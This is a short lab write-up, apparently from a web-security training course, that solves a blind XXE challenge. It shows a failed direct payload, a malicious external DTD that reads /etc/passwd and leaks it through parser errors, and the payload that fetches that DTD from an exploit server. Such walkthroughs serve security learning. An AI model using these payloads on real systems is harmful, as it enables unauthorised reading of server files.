# Lab: Exploiting blind XXE to retrieve data via error messages

Description :  This lab has a "Check stock" feature that parses XML input but does not display the result.

To solve the lab, use an external DTD to trigger an error message that displays the contents of the `/etc/passwd` file.

The lab contains a link to an exploit server on a different domain where you can host your malicious DTD.

Analysis:

- First try :

using this direct payload didn't work

```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE lol [
<!ENTITY % desired SYSTEM "file:///etc/passwd" >
<!ENTITY % raise SYSTEM "file:///DUK33D/%desired;" >
%raise;
]
>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

-> "XML parser exited with error: java.lang.IllegalArgumentException: Error decoding percent encoded characters"

- by hosting this remote DTD

```XML
<!ENTITY % desired SYSTEM "file:///etc/passwd" >
<!ENTITY % parent "<!ENTITY &#x25; son SYSTEM 'file:///DUK33D/%desired;'>" > 
%parent;
%son;
```

and invoking it using

```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE lol [
<!ENTITY % raising SYSTEM "https://exploit-0a19007503299dec812d3d4201c600e7.exploit-server.net/exploit">
%raising;
]

>
```

all done
